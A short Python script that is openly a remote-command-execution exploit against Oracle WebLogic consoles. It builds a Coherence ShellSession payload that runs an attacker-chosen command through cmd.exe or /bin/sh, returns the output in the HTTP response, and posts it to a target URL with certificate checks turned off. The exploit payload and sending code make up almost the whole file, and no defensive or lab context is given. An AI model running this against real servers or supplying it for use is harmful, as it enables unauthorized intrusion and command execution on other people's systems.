import requests

def exploit_weblogic(target_url, command):
    """
    Attempts to exploit a vulnerability in WebLogic servers to execute a specified command.
    
    :param target_url: The URL of the target WebLogic server.
    :param command: The command to be executed on the target system.
    """
    # Constructing the exploit payload
    payload = (
        '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('
        '"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();'
        'weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();'
        'java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\\"connectionHandler\\");'
        'field.setAccessible(true);'
        'Object obj = field.get(adapter);'
        'weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\\"getServletRequest\\").invoke(obj);'
        'String[] cmds = System.getProperty(\\"os.name\\").toLowerCase().contains(\\"window\\") ? new String[]{"cmd.exe", "/c", '
        + '"' + command + '"} : new String[]{"/bin/sh", "-c", "' + command + '"};'
        'String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\\A").next();'
        'weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\\"getResponse\\").invoke(req);'
        'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
        'res.getServletOutputStream().flush();'
        'res.getWriter().write("");'
        'executeThread.interrupt();")'
    )

    # Headers for the POST request
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0',
    }

    try:
        # Sending the exploit payload to the target URL
        response = requests.post(target_url, headers=headers, data=payload, verify=False)

        if response.status_code == 200:
            print("Command executed successfully.")
        else:
            print(f"Failed to execute command. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Example usage (Replace 'http://target_url/console' and 'your_command' with actual target URL and command)
# exploit_weblogic('http://target_url/console', 'your_command')
